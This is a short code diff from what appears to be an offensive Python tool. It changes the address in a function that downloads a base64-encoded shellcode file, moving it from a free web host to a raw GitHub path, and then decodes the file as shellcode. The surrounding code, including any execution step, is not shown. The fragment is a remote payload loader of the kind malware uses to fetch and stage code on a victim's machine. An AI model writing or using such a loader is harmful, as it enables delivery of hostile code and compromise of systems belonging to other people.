@@ -11,7 +11,7 @@ import threading
 
 # retrieve shellcode from server
 def shell_code():
-    url = "http://psyberlupus.000webhostapp.com/shellcode.bin"
+    url = "https://raw.githubusercontent.com/Psyberlupus/psygn/master/modules/shellcode.bin"
     response = urllib2.urlopen(url)
 # decode the shellcode from base64
     shellcode = base64.b64decode(response.read())
